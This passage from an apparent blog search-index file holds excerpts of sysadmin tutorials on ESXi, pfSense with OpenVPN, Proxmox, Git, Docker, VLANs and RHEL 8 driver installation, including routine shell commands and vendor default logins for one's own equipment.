of VM disk. Add second network adapter. Join them with Internal and External PG.    Select an installation ISO image uploaded earlier.    Check the result of configuring VM.    Install pfSense   After that the VM has to be created. And we can click to button Power on for start installation.    In many of screens I’ve just clicked Next and haven’t change anything.          Configure pfSense   After reboot system will offer to setup network interfaces    Open VM setting in ESXi to be right in this choose. And view network interface MACs.    The WAN interface should be the virtual interface connected to External port group.    Another interface will be LAN.    Next see the results and continue the configuring in browser by 192.168.1.1.    Open browser and login in pfSense web configurator with default credentials (admin:pfsense)    Skip welcome page. And read Netgear support information if you need.     Set hostname, NTP, timezone.     Configure WAN interface. My instance get IP by DHCP.    Configure LAN network. Set a new network address 192.168.112.1/24. Remember WebGUI will have a new IP after reboot.    Set new admin password.    Click Reload button.     Open new browser tab with new WebGUI instance accessed by IP 192.168.112.1.    Setup OpenVPN   VMs and ESXi don’t have any public IP. But we can get full access to them if we will install OpenVPN. I have another pfSense server with public IP. It will be OpenVPN Server. This ESXi host and pfSense instance will connect to server and share their LAN (192.168.112.1). We name pfSense that we configurating in this article as OpenVPN Client. So for this purposes we need to do some manipulation with OpenVPN Server.   Open VPN page in WebGUI. Click Add button and create new OpenVPN Server. Select Peer to peer (shared key) server mode. Set listen port 1201 (it can be any other). Edit another options if it needs.    After we click Save the shared key of the server will be generated. Open created server.     Copy generated key. It will need to connect client to this server.    Now open WebGUI of another pfSense that will OpenVPN Client. Open VPN page. Click Add.    Setup OpenVPN client by my example. I highlight options that I modified.    Click save and apply changes.    Open status page of VPN connection    The status will be up.    Open Firewall configuration page. Follow to OpenVPN tab.    Create new rule with allow traffic through this adapter to LAN net.    Create another pass rule for LAN interface allows anything.    Apply the changes.    Now we can connect to pfSense (that configuring as OpenVPN client) by local IP (192.168.112.1). ESXi server can be hosted in any place. If it connected to Internet also through NAT. OpenVPN will auto connect to our public VPN server.   But to access to ESXi webGUI we should make some addition.   Setup ESXi on private LAN   We have an additional management virtual interface that connected to vSwitchLAN - vmk1. We made it before.    Open the interface, and make sure that it has a right IP adress - 192.168.112.1.    Open TCP/IP stack tab. Select Default TCP/IP stack.    Click Edit settings button.    Manually configure it. Set pfSense IP as default gateway.    We will lose the access to ESXi WebGUI. It’s OK. Just open it in new IP - 192.168.112.2    Open VMKernel NIC’s tab.    Remove the management interface connected to External network to vSwitch0.    Confirm remove.    Now we have access only from OpenVPN tunnel or LAN network.    Also we can delete unused Management network port group.     Enable autorun pfSense VM   ESXi doesn’t run any VMs after power on by default. You should enable this manually. It’s a simple. Open Virtual machines page and select fw.    Enable autostart for selected VM.    Install VM tools   ESXi will show you the notice message until you install VM tools.     VMware Tools is not installed in this virtual machine. VMware Tools allows detailed guest information to be displayed as well as allowing you to perform operations on the guest OS, e.g. graceful shutdown, reboot, etc. You should install VMware Tools.       VM tools is very helpful instrument. And VMWare haven’t it for FreeBSD. But exists Open VM tools package. It can be easily installed on pfSense Package manager page.    Search and install Open VM tools.    View success result of installation the package.    Done! Now you can create any virtual machines on ESXi host and get full access to them by secure VPN tunnel :)   Some notes   After I install Open VM Tools ESXi will show a warning message:     The configured guest OS (FreeBSD 12 or later versions (64-bit)) for this virtual machine does not match the guest that is currently running (FreeBSD 11 (64-bit)). You should specify the correct guest OS to allow for guest-specific optimizations.       To avoid this just change the Guest OS Version to FreeBSD 11 (64-bit) and will be happy.    Additional information      VMware Virtual Networking Concepts -   The information guide to VMware Networks.  ","categories": ["sysad"],
        "tags": ["esxi","pfsense","openvpn"],
        "url": "https://gainanov.pro/eng-blog/sysad/esxi-pfsense-vpn/",
        "teaser": null
      },{
        "title": "ESXi. The command line and shell magic",
        "excerpt":"Introduction   ESXi is a type-1 hypervisor, meaning it runs directly on system hardware without the need for an operating system (OS). Type-1 hypervisors are also referred to as bare-metal hypervisors because they run directly on hardware.   VMware provides a powerful and convenient graphical interface for managing ESXi servers.   In this case, using the command line interface (CLI) is what you need – it is possible to configure all settings, including the hidden ones in the command line which is also referred to as the console. In addition to traditional commands that are the same in Linux and ESXi, ESXi has its own ESXCLI commands.   ESXCLI is a part of the ESXi shell, this is a CLI framework intended to manage a virtual infrastructure (ESXi components such as hardware, network, storage, etc.) and control ESXi itself on the low level. All ESXCLI commands must be run in the ESXi shell (console). Generally, ESXCLI is the command that has a wide list of subcommands called namespaces and their options. The ESXCLI command is present right after ESXi installation along with other ESXi shell commands. Notice that ESXCLI commands are case-sensitive, similarly to other console commands used in ESXi.   The ESXCLI log file is located in /var/log/esxcli.log.   The data is written to this file if an ESXCLI command has not been executed successfully. If an ESXCLI command is run successfully, nothing is written to this log file.   The most useful ESXCLI commands are explained in today’s blog post.   Environment   In this article I have VMware ESXi Hypervisor 6.7 U3 (Free version)   Usage   How to open the CLI in ESXi?   By default, ESXi shell is disabled for local and remote access; hence, you are not able to run ESXi shell commands until you enable the ESXi shell. VMware has made this restriction for security reasons.   You can enable this with local command line direct connected to ESXi host (named DCUI) or with WebGUI (throw web-browser).   Using the ESXi default interface. In the ESXi Direct Console User Interface (DCUI), go to Troubleshooting Options, navigate to Enable ESXi Shell and Enable SSH strings and press Enter to enable each option.   After enabling the ESXi shell, press Alt+F1 to open the console on the machine running ESXi. You should enter your login and password after that (credentials of the root user can be used). If you need to go back to the ESXi DCUI, press Alt+F2.   The Enable SSH option allows you to open the ESXi console remotely by using an SSH client.   Command list   The entire list of all available ESXCLI namespaces and commands is displayed after running the command:  esxcli esxcli command list   Checking hardware   To view installed PCI devices, run the following ESXCLI command:  esxcli hardware pci list | more   Check the amount of memory installed on the ESXi server:  esxcli hardware memory get   View the detailed information about installed processors:  esxcli hardware cpu list   Change a hostname   Run these commands to change the hostname:  esxcli system hostname set --host=hostname esxcli system hostname set --fqdn=fqdn   Power control ESXi host   Power off an ESXi host:  esxcli system shutdown poweroff   The command for rebooting the host is similar. To write a reason of rebooting use -r:  esxcli system shutdown reboot -r \"applying new update\"   Start and stop VM   The basic command to control the virtual machines is  vim-cmd vmsvc   To list all virtual machines run:  vim-cmd vmsvc/getallvms   To work with individual VMs you need the &lt;ID&gt; provided by the previous command.   To get a summary of the machine run (where &lt;ID&gt; is a number):  vim-cmd vmsvc/get.summary &lt;ID&gt;   To power on/power off/suspend a VM run:  vim-cmd vmsvc/power.on &lt;ID&gt; vim-cmd vmsvc/power.off &lt;ID&gt; vim-cmd vmsvc/power.suspend &lt;ID&gt;   Stop VM via esxcli   Use this to forcibly stop a virtual machine.   List all running virtual machines on the system to see the World ID of the virtual machine that you want to stop.  esxcli vm process list   Stop the virtual machine by running the following command.  esxcli vm process kill --type &lt;kill_type&gt; --world-id &lt;ID&gt;   The command supports three --type options. The following types are supported through the --type option:     soft. Gives the VMX process a chance to shut down cleanly (like kill or kill -SIGTERM)   hard. Stops the VMX process immediately (like kill -9 or kill -SIGKILL)   force. Stops the VMX process when other options do not work.   https://pubs.vmware.com/vsphere-51/index.jsp?topic=%2Fcom.vmware.vcli.examples.doc%2Fcli_manage_vms.10.9.html   Autostart of VM   Get a list of virtual machine IDs:  vim-cmd vmsvc/getallvms   Enable force autostart feature:  vim-cmd hostsvc/autostartmanager/enable_autostart true   Now check the VMs startup settings:  vim-cmd hostsvc/autostartmanager/get_autostartseq   Make sure that the startAction value of the VM has changed to powerOn.   Uplink of vSwitch   For example you have one physical nic on your ESX then that called vmnic0. If you have one vSwitch it will be called vSwitch0.   To list your vSwitch run:  esxcfg-vswitch -l   If you have no vmnic or are missing the one that you want to use for the management network then you need to add it by using the following command:  esxcfg-vswitch -L vmnic0 vSwitch0   Replace vmnic0 with your vmnic and same for the switch.   So if I wanted to remove vmnic0 from vSwitch0 I would use the following command:  esxcfg-vswitch -U vmnic0 vSwitch0   Enter to maintenance mode   Enter the host to the maintenance mode.   esxcli system maintenanceMode set --enable yes   or   vim-cmd hostsvc/maintenance_mode_enter   Get currently status of the host  esxcli system maintenanceMode get   Backup configuration   Using the ESXi Command Line to Back up ESXi Host. You don’t need to install any additional software to use the ESXi command line. You have to enable ESXi shell and remote SSH access to an ESXi host. Once you have connected to your ESXi host via SSH, you can run the commands.   ESXi configuration is saved every hour automatically to the /bootblank/state.tgz file. For this reason, you should ensure that the current ESXi configuration is written to ESXi configuration files right now to confirm that all changes made to ESXi configuration since the last autosave are saved:   vim-cmd hostsvc/firmware/sync_config   Back up ESXi configuration:  vim-cmd hostsvc/firmware/backup_config  The result:  Bundle can be downloaded at : http://*/downloads/52f857f5-1bed-7e86-7c8b-c8c389f4d7b6/configBundle-localhost.localdomain.tgz   As a result, you’ll receive a link to download the configBundle.tgz archive from the ESXi host. You should replace the asterisk with the IP address of your ESXi host. The archive file that contains the ESXi configuration backup is saved to the /scratch/downloads directory. The scratch partition was mentioned in the blog post about installing ESXi on a USB Flash drive.   Restore configuration   You should have ESXi of the same version and build number installed on the machine where you want to restore the ESXi configuration. The UUID must be the same on both the ESXi server that was backed up and the ESXi server on which the configuration must be restored (can be obtained using the command esxcfg-info -u).      Use numeric 1 as force option to override the UUID mismatch. For example, vim-cmd hostsvc/firmware/restore_config 1 /tmp/configBundle.tgz. The UUID value of the backed up ESXi host is mentioned in the Manifest.txt file inside the configBundle.tgz backup archive.    Once you have prepared your freshly installed ESXi host to restore ESXi configuration from a backup, connect to the ESXi host via SSH and enter the host to the maintenance mode.  esxcli system maintenanceMode set --enable yes   Copy the archive that contains the ESXi configuration backup configBundle-xxxx.tgz archive from a local machine to the /tmp/ directory on the destination ESXi server.   Rename the configBundle-xxxx.tgz file to configBundle.tgz before you enter a command to restore ESXi configuration. Otherwise you will get an error message: File /tmp/configBundle.tgz was not found.   Restore the ESXi configuration:  vim-cmd hostsvc/firmware/restore_config /tmp/configBundle.tgz   After running this command an ESXi host will be rebooted automatically.   Login to console by SSH rsa key   You should have a SSH key on the host that you would like to connect to ESXi. So I think you already know how to generate ssh-keys, I just write command to add keys to the ESXi host - esxi.machine.com.   cat ~/.ssh/id_rsa.pub | ssh root@esxi.machine.com 'cat &gt;&gt; /etc/ssh/keys-root/authorized_keys'   Configuring Login Behavior   ESXi has a good security feature to add a root account lockout for safety. After a number of failed login attempts, the server will trigger a lockout. By default, a maximum of five failed attempts is allowed before the account is locked. The account is unlocked after 15 minutes by default.   You can configure the login behavior for your ESXi host with the following advanced options:     Security.AccountLockFailures - Maximum number of failed login attempts before a user’s account is locked. Zero disables account locking.   Security.AccountUnlockTime - Number of seconds that a user is locked out.      Remote access for ESXi local user account ‘root’ has been locked for 120 seconds after xxx failed login attempts.    Are you seeing this message? Do not worry, you are in the right place.  Now, let’s look at what to do if your ESXi root account is locked. The command line to clear the lockout status and reset the count to zero for an account is shown here with the root account as an example:   pam_tally2 --user root --reset   Conclusion   Today’s blog post has covered a series of ESXi shell commands. Using the command line interface gives you more power in addition to WebGUI. You can use ESXi shell commands for viewing and configuring settings that are hidden or not available in the GUI. Use the ESXi shell commands list provided in this blog post for fine ESXi tuning.   Additional information      How to Back Up and Restore VMware ESXi Host Configuration - Backup and restore instructions from Nakivo.   Best ESXCLi and ESXi Shell Commands for your VMware Environment - A one of explanation of the most often used ESXi shell commands from Nakivo.   How to back up ESXi host configuration (2042141)- How to back up and restore the ESXi host from VMWare.   How to Backup and Restore the VMware ESXi 6.5 Configuration - Another manual instruction to this. This one from graspingtech.   Резервное копирование настроек VMWare ESXI - On Russian language.   Configure Autostart of VM on VMware ESXi - Some information about starting VM process, and how to do it with cmd  ","categories": ["sysad"],
        "tags": ["esxi","shell","vm"],
        "url": "https://gainanov.pro/eng-blog/sysad/esxi-shell-commands/",
        "teaser": null
      },{
        "title": "Supermicro IPMI default password",
        "excerpt":"The default username and password of Supermicro IPMI below.   USERNAME -    ADMIN   PASSWORD -    ADMIN   It is case sensitive.  ","categories": ["sysad"],
        "tags": ["supermicro","credentials"],
        "url": "https://gainanov.pro/eng-blog/sysad/supermicro-ipmi-default-password/",
        "teaser": null
      },{
        "title": "Setup VLAN interface on CentOS",
        "excerpt":"There are some scenarios where we want to assign multiple IPs from different VLAN on the same Ethernet card (nic) on Linux servers (CentOS / RHEL). This can be done by enabling VLAN tagged interface.   Let’s assume we have a Linux Server, there we have one Ethernet card (em1).   So attach VLANs 4 tag to NIC em1 using the ip command  ip link add link em1 name vlan4 type vlan id 4   To view the VLAN, issue the following command:  ip -d link show vlan4   Bring up the interface using below ip command:  ip link set dev vlan4 up   Now we can assign the IP address to tagged interface from their respective VLANs using beneath ip command,  ip addr add 172.16.3.188/24 dev vlan4   To delete created VLAN interface use next command  ip link delete dev vlan4@em1   It will work to the next reboot. For saving the configuration edit the network settings stored in directory /etc/sysconfig/network-scripts/.   Additional information      ip command cheat sheet - For Red Hat Enterprise Linux.   Configure 802.1q vlan tagging using the command line - Manual from RHEL authors.   How to Configure VLAN tagged NIC (Ethernet Card) on Linux Servers- Another instruction to configure VLAN on Linux.  ","categories": ["sysad"],
        "tags": ["linux","centos","vlan"],
        "url": "https://gainanov.pro/eng-blog/sysad/centos-vlan/",
        "teaser": null
      },{
        "title": "Git. Squash Multiple Commits in to One Commit",
        "excerpt":"In Git you can merge several commits into one with the powerful interactive rebase. It’s a handy tool I use quite often; I usually tidy up my working space by grouping together several small intermediate commits into a single lump to push upstream.   choose your starting commit   When you squash commits, you’re combining 2 or more commits in to a single commit. For example, let’s say your recent commit history looks something like this:   $ git log --pretty=format:\"%h %ad | %s [%an]\" --graph --date=short  * 639c220 2019-11-21 | #454, CI is fully implemented [Ruslan Gainanov]  --- newer commit * f1a9a3e 2019-11-21 | fix [Ruslan Gainanov] * 67f56b9 2019-11-21 | fix [Ruslan Gainanov] * 2673619 2019-11-21 | fix [Ruslan Gainanov] * a5398ae 2019-11-21 | fix [Ruslan Gainanov] * 6f577b6 2019-11-21 | fix [Ruslan Gainanov] * 3aee03c 2019-11-20 | #454, prepare new CI [Ruslan Gainanov]           --- older commit * e807180 2019-11-18 | #123, feature Y implemented [romanicus]          --- parent commit   I’m working on a CI feature. And this is what I would like to do:  * 639c220 2019-11-21 | #454, CI is fully implemented [Ruslan Gainanov]  --- newer commit  --┐ * f1a9a3e 2019-11-21 | fix [Ruslan Gainanov]                                                | * 67f56b9 2019-11-21 | fix [Ruslan Gainanov]                                                | * 2673619 2019-11-21 | fix [Ruslan Gainanov]                                                |---- Join these into one * a5398ae 2019-11-21 | fix [Ruslan Gainanov]                                                | * 6f577b6 2019-11-21 | fix [Ruslan Gainanov]                                                | * 3aee03c 2019-11-20 | #454, prepare new CI [Ruslan Gainanov]           --- older commit ---┘ * e807180 2019-11-18 | #123, feature Y implemented [romanicus]   I often have tons of commits to squash. And a command git rebase -i HEAD~[N] with number of commits you want to join (N), starting from the most recent one, doesn’t accept for me.   Also I don’t want to count how many commits should be squashed. So there is another way:  git rebase --interactive [commit-hash]   Where commit-hash is the hash of the commit just before the first one you want to rewrite from. So in my example the command would be:  git rebase --interactive e807180   Where e807180 is Feature Y. You can read the whole thing as:     Merge all my commits on top of commit [commit-hash].    Way easier, isn’t it?   picking and squashing   At this point your editor of choice will pop up, showing the list of commits you want to merge. Note that it might be confusing at first, since they are displayed in a reverse order, where the older commit is on top.   I’ve added --- older commit and --- newer commit to make it clear, you won’t find those notes in the editor.  3aee03c #454, prepare new CI               --- older commit 6f577b6 fix                  a5398ae fix 2673619 fix 67f56b9 fix f1a9a3e fix 639c220 #454, CI is fully implemented      --- newer commit  [...]   Below the commit list there is a short comment (omitted in my example) which outlines all the operations available. You can do many smart tricks during an interactive rebase, let’s stick with the basics for now though. Our task here is to mark all the commits as squashable, except the first/older one: it will be used as a starting point.   You mark a commit as squashable by changing the work pick into squash next to it (or s for brevity, as stated in the comments). The result would be:  pick 3aee03c #454, prepare new CI                --- older commit s 6f577b6 fix                  s a5398ae fix s 2673619 fix s 67f56b9 fix s f1a9a3e fix s 639c220 #454, CI is fully implemented         --- newer commit  [...]   Save the file and close the editor.   create the new commit   You have just told Git to combine all seven commits into the the first commit in the list. It’s now time to give it a name: your editor pops up again with a default message, made of the names of all the commits you have squashed.   I wipe out the default message and use something more self-explanatory like Implemented CI.   pushing the squashed commit   If the commits have been pushed to the remote:  git push origin +name-of-branch   The plus sign forces the remote branch to accept your rewritten history, otherwise you will end up with divergent branches.   If the commits have NOT yet been pushed to the remote:  git push origin name-of-branch   In other words, just a normal push like any other   conclusion   Fixing up your commits in this way is good practice before sharing with your team members or before pushing the changes to a remote repository. It’s much easier to read through a source tree and understand what bugs have been fixed when a single commit fixes a single bug, for example.   additional information      git-rebase - Reapply commits on top of another base tip - Full information about git-rebase command.   Squash commits into one with Git - The base of this article.   Git_ Squash Multiple Commits in to One Commit - Another good source that I use to get more knowledge about git squash.   How can I merge two commits into one if I already started rebase - Stack Overflow - Conversation in Stack Overflow about this topic.   ","categories": ["dev"],
        "tags": ["git","linux"],
        "url": "https://gainanov.pro/eng-blog/dev/git-squash-multiple-commits/",
        "teaser": null
      },{
        "title": "Dockerfile. ARG and ENV statement differences",
        "excerpt":"The ARG and ENV statements use for define variables in to Dockerfile. It may be difficult to understand the difference. The difference is when variables will be utilized.   If you need build-time customization, ARG is best choice. From docker reference:     The ARG instruction defines a variable that users can pass at build-time to the builder with the docker build command using the –build-arg = flag.    If you need run-time customization (to run the same image with different settings), ENV is well-suited. What you should know from docs:     The ENV instruction sets the environment variable  to the value . The environment variables set using ENV will persist when a container is run from the resulting image.    To define them as the command line instructions use next (for ARG var or ):   ARG (for ARG var): docker build --build-arg var=xxx   ENV (for ENV var): docker run --env var=yyy   The best way define them is write a docker-compose file with defined next section:  version: \"3\" services:   ubuntu:     build:       context: .       args:         var: xxx     environment:       var: yyy   To run container with build image use next command  docker-compose up --build   conclusion   I hope this explanation has helped you to learn a bit more about using dockerfile statements, and will save you time to understand the basis of Docker.   ","categories": ["devops"],
        "tags": ["docker","dockerfile","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/dockerfile-env-arg-differences/",
        "teaser": null
      },{
        "title": "ESXi. Enabling Nested virtualization",
        "excerpt":"Nested virtualization is when you run an hypervisor, like PVE or others, inside a virtual machine (which is of course running on another hypervisor) instead that on real hardware. In other words, you have a host hypervisor, hosting a guest hypervisor (as a vm), which can hosts its own vms.   This obviously adds an overhead to the nested environment, but it could be useful in some cases:     test (or learn) how to manage hypervisors before actual implementation,   test some dangerous/tricky procedure involving hypervisors before actually doing it on the real thing,   enable businesses to deploy their own virtualization environment, e.g. on public services (cloud)   Requirements   In order to have the fastest possible performance, near to native, any hypervisor should have access to some (real) hardware features that are generally useful for virtualization, the so called ‘hardware-assisted virtualization extensions’ (see http://en.wikipedia.org/wiki/Hardware-assisted_virtualization).   In nested virtualization, also the guest hypervisor should have access to hardware-assisted virtualization extensions, and that implies that the host hypervisor should expose those extension to its virtual machines. In principle it works without those extensions too but with poor performance and it is not an option for productive environment (but maybe sufficient for some test cases).   Configuration   To enable ESXi nested virtualization use next command that added the vhv.allow parameter to the configuration file.  echo 'vhv.allow = \"TRUE\"' &gt;&gt; /etc/vmware/config   You can now enable VHV on a per VM basis and using the Web Client which basically adds the vhv.enable = \"true\" parameter to the VM’s .VMX configuration file.   If you are creating a nested ESXi/Proxmox VM, and you enable the checkbox for:      Hardware virtualization: Expose hardware assisted virtualization to the guest OS       This sets the same value as if manually adding ​vhv.enable = “true”​ to the .vmx file. So with that said, if you created a nested ESXi VM using the Web Client and enabled that option then you don’t need to add it manually.   Once installed the guest OS, if GNU/Linux you can enter and verify that the hardware virtualization support is enabled by doing   # egrep '(vmx|svm)' --color=always /proc/cpuinfo   Non empty results will sign about success of enabling virtualization:  flags           : fpu ... ... vmx ... ... arch_capabilities   Additional information      Enabling Nested virtualization on ESXi   Nested Virtualization - VirtualBox inside ESXi - Good explanation about nested virtualization with VirtualBox   Nested Virtualization - From Proxmox authors  ","categories": ["sysad"],
        "tags": ["esxi","vm"],
        "url": "https://gainanov.pro/eng-blog/sysad/esxi-enable-nested-virtualization/",
        "teaser": null
      },{
        "title": "Proxmox. Remove subscription notice",
        "excerpt":"   You do not have a valid subscription for this server. Please visit www.proxmox.com to get a list of available options    If you also like me tired to view this message again and again after login in to Proxmox you want to remove it. This message appears from 5.1 version and newer (including 6.0).   To remove it run the command bellow. You will need to SSH to your Proxmox machine or use the node console through the PVE web interface.   Run the following commands and then clear your browser cache:  sed -i.bak \"s/data.status !== 'Active'/false/g\" /usr/share/javascript/proxmox-widget-toolkit/proxmoxlib.js  systemctl restart pveproxy.service   After that the message will be hided. But for full disable unnecessary Enterprise functions need remove PVE repository from apt repo list.   Remove the repository:  rm /etc/apt/sources.list.d/pve-enterprise.list   Add a repository for free community version (buster - for Debian 10 (Proxmox 6.x)):  echo \"deb http://download.proxmox.com/debian/pve buster pve-no-subscription\" &gt; /etc/apt/sources.list.d/pve-install-repo.list  wget http://download.proxmox.com/debian/proxmox-ve-release-6.x.gpg -O /etc/apt/trusted.gpg.d/proxmox-ve-release-6.x.gpg   Next update packages and system and reboot PVE.  apt-get update &amp;&amp; apt-get upgrade -y apt-get dist-upgrade reboot   Additional information      Remove Subscription Notice - There I found the solution to remove the notice in one line   Как убрать сообщение о подписке в Proxmox? - Second part of this instruction   Proxmox, Ceph, ZFS, pfsense и все-все-все - The maximum information about Proxmox on one page  ","categories": ["sysad"],
        "tags": ["proxmox","linux","debian","vm"],
        "url": "https://gainanov.pro/eng-blog/sysad/proxmox-remove-subscription-notice/",
        "teaser": null
      },{
        "title": "ESXi. NTP Configuration",
        "excerpt":"Would you like to learn how to set date and time using the Vmware ESXi NTP feature? In this tutorial, I am going to show you how to configure date and time using NTP on a Vmware ESXi server. This tutorial was tested on Vmware ESXi 6.7   First, you need to access the Vmware web interface. After a successful login into ESXi go to Manage &gt; System &gt; Time &amp; date. Click on Edit.      Select Start and stop with host option.   Insert desired NTP servers comma separated, i.e.:  0.ru.pool.ntp.org, 1.ru.pool.ntp.org, 2.ru.pool.ntp.org, 3.ru.pool.ntp.org   Now, we need to start the NTP service. Click on the Actions button. Select the NTP service menu. Click on the Start option.      The NTP will start immediately.   Congratulations! You successfully finished the Vmware ESXi NTP configuration.   Additional information      Tutorial - Vmware ESXi NTP Configuration   ESXi 6.7 — настройка NTP  ","categories": ["sysad"],
        "tags": ["esxi","ntp"],
        "url": "https://gainanov.pro/eng-blog/sysad/esxi-ntp-configuration/",
        "teaser": null
      },{
        "title": "RHEL8. Install to DELL server with RAID (SAS2008)",
        "excerpt":"In RHEL/CentOS 8 was be removed many drivers for popular enterprise raid-controllers. It brings some troubles when you try to install OS. Without drivers an installation destination section will be empty. No drives will be found. To see your HDD in the server need add drivers back.   With ELRepo it will be easy. ELRepo repository includes a lot of drivers. The full list of supported drives here. I found an ID of raid-controller for my DELL PowerEdge C6320 in the list. Read next, and I show how it is possible install CentOS 8 in the DELL server.   Setup   First of all we must understand what raid controller is installed into server. Use command lspci -nn for show all connected devices  Serial Attached SCSI controller [0107]: LSI Logic / Symbios Logic SAS2008 PCI-Express Fusion-MPT SAS-2 [Falcon] [1000:0072] (rev 03)  I get this output in my another similar server with CentOS 7.   Also I check it in the BIOS, and the name is similar - LSI SAS2 MPT Controller SAS2008.   Main part of this - 1000:0072 - is a device ID. It helps to us found a right driver from ELRepo.   Next, we need to choose what DUD (driver update disk) we should to use in installation process for our hardware. Follow to this page and find our ID (1000:0072). It point to the mpt3sas.ko section. So, we need to use a las mpt3sas iso images from here. When I wrote this article it is - dd-mpt3sas-28.100.00.00-2.el8_1.elrepo.iso.   For using them during installation need to made some required actions. Read the instruction from Red Hat about it.   I just show you the simple method that I used. My server has connected to local network and internet. DHCP-server in the LAN assign an IP-address to the server, and server can download any resources from network. So it is the reason why I prefer to add drivers by http link. What we will need to do?   Run the installation process. When boot menu window has been shown, press the Tab key on your keyboard to display the boot command line.      Append the inst.dd=https://elrepo.org/linux/dud/el8/x86_64/dd-mpt3sas-28.100.00.00-2.el8_1.elrepo.iso boot option to the command line and press Enter to execute the boot process.   The installer should detect the DUD iso and install the proper drivers. And raid controller with drives will be accessed as installation destination.      So, now you can install the last RHEL/CentOS into DELL Server. After reboot the system the drivers will be included into installed system.   The information about the mpt3sas module presented below:  [root@cpu7 ~]# modinfo mpt3sas filename:       /lib/modules/4.18.0-147.3.1.el8_1.x86_64/weak-updates/mpt3sas/mpt3sas.ko alias:          mpt2sas version:        28.100.00.00 license:        GPL description:    LSI MPT Fusion SAS 3.0 Device Driver author:         Avago Technologies &lt;MPT-FusionLinux.pdl@avagotech.com&gt; rhelversion:    8.1 srcversion:     6ABC8F89B061AC0B78BCED5 alias:          pci:v00001000d000000E6sv*sd*bc*sc*i* alias:          pci:v00001000d000000E5sv*sd*bc*sc*i* alias:          pci:v00001000d000000B2sv*sd*bc*sc*i* alias:          pci:v00001000d000000E2sv*sd*bc*sc*i* alias:          pci:v00001000d000000E1sv*sd*bc*sc*i* alias:          pci:v00001000d000000D1sv*sd*bc*sc*i* alias:          pci:v00001000d000000ACsv*sd*bc*sc*i* alias:          pci:v00001000d000000ABsv*sd*bc*sc*i* alias:          pci:v00001000d000000AAsv*sd*bc*sc*i* alias:          pci:v00001000d000000AFsv*sd*bc*sc*i* alias:          pci:v00001000d000000AEsv*sd*bc*sc*i* alias:          pci:v00001000d000000ADsv*sd*bc*sc*i* alias:          pci:v00001000d000000C3sv*sd*bc*sc*i* alias:          pci:v00001000d000000C2sv*sd*bc*sc*i* alias:          pci:v00001000d000000C1sv*sd*bc*sc*i* alias:          pci:v00001000d000000C0sv*sd*bc*sc*i* alias:          pci:v00001000d000000C8sv*sd*bc*sc*i* alias:          pci:v00001000d000000C7sv*sd*bc*sc*i* alias:          pci:v00001000d000000C6sv*sd*bc*sc*i* alias:          pci:v00001000d000000C5sv*sd*bc*sc*i* alias:          pci:v00001000d000000C4sv*sd*bc*sc*i* alias:          pci:v00001000d000000C9sv*sd*bc*sc*i* alias:          pci:v00001000d00000095sv*sd*bc*sc*i* alias:          pci:v00001000d00000094sv*sd*bc*sc*i* alias:          pci:v00001000d00000091sv*sd*bc*sc*i* alias:          pci:v00001000d00000090sv*sd*bc*sc*i* alias:          pci:v00001000d00000097sv*sd*bc*sc*i* alias:          pci:v00001000d00000096sv*sd*bc*sc*i* alias:          pci:v00001000d0000007Esv*sd*bc*sc*i* alias:          pci:v00001000d000002B1sv*sd*bc*sc*i* alias:          pci:v00001000d000002B0sv*sd*bc*sc*i* alias:          pci:v00001000d0000006Esv*sd*bc*sc*i* alias:          pci:v00001000d00000087sv*sd*bc*sc*i* alias:          pci:v00001000d00000086sv*sd*bc*sc*i* alias:          pci:v00001000d00000085sv*sd*bc*sc*i* alias:          pci:v00001000d00000084sv*sd*bc*sc*i* alias:          pci:v00001000d00000083sv*sd*bc*sc*i* alias:          pci:v00001000d00000082sv*sd*bc*sc*i* alias:          pci:v00001000d00000081sv*sd*bc*sc*i* alias:          pci:v00001000d00000080sv*sd*bc*sc*i* alias:          pci:v00001000d00000065sv*sd*bc*sc*i* alias:          pci:v00001000d00000064sv*sd*bc*sc*i* alias:          pci:v00001000d00000077sv*sd*bc*sc*i* alias:          pci:v00001000d00000076sv*sd*bc*sc*i* alias:          pci:v00001000d00000074sv*sd*bc*sc*i* alias:          pci:v00001000d00000072sv*sd*bc*sc*i* alias:          pci:v00001000d00000070sv*sd*bc*sc*i* depends:        scsi_transport_sas,raid_class name:           mpt3sas vermagic:       4.18.0-147.el8.x86_64 SMP mod_unload modversions sig_id:         PKCS#7 signer:         ELRepo.org Secure Boot Key sig_key:        E9:D4:71:CF:B4:FE:13:6C sig_hashalgo:   sha256 signature:      15:E2:B9:0D:5D:4D:A8:C0:4B:A6:75:CD:F7:53:C4:E9:C8:02:88:94:                 8F:2F:36:13:E8:56:55:FE:FC:D7:74:CD:37:29:25:7D:11:11:99:E5:                 8C:B2:98:3F:C6:A6:FA:CC:BC:53:66:26 parm:           logging_level: bits for enabling additional logging info (default=0) parm:           max_sectors:max sectors, range 64 to 32767  default=32767 (ushort) parm:           missing_delay: device missing delay , io missing delay (array of int) parm:           max_lun: max lun, default=16895  (ullong) parm:           hbas_to_enumerate: 0 - enumerates both SAS 2.0 &amp; SAS 3.0 generation HBAs                   1 - enumerates only SAS 2.0 generation HBAs                   2 - enumerates only SAS 3.0 generation HBAs (default=0) (ushort) parm:           diag_buffer_enable: post diag buffers (TRACE=1/SNAPSHOT=2/EXTENDED=4/default=0) (int) parm:           disable_discovery: disable discovery  (int) parm:           prot_mask: host protection capabilities mask, def=7  (int) parm:           max_queue_depth: max controller queue depth  (int) parm:           max_sgl_entries: max sg entries  (int) parm:           msix_disable: disable msix routed interrupts (default=0) (int) parm:           smp_affinity_enable:SMP affinity feature enable/disable Default: enable(1) (int) parm:           max_msix_vectors: max msix vectors (int) parm:           irqpoll_weight:irq poll weight (default= one fourth of HBA queue depth) (int) parm:           mpt3sas_fwfault_debug: enable detection of firmware fault and halt firmware - (default=0)   Additional information      The ELRepo Blog - RHEL 8.0 and support for removed adapters - an article in ELRepo blog about DUD that they provide to community   Installing RHEL 8.1 on Dell R710_R610 with H700 Raid Controller _ FATMIN - instruction for another DELL server with megaraid_sas drivers   removal of SAS-2 controller drivers in RHEL 8 - Red Hat Customer Portal - a hot discussions in redhat forum about removed drivers   Updating drivers during installation Red Hat Enterprise Linux 8 - official instruction about driver update during installation process   ","categories": ["linux"],
        "tags": ["dell","centos","raid","drivers"],
        "url": "https://gainanov.pro/eng-blog/linux/rhel8-install-to-dell-raid/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/dell-rhel8-install-drivers.jpg"
      },{
        "title": "CentOS 8. Automated installation using Kickstart",
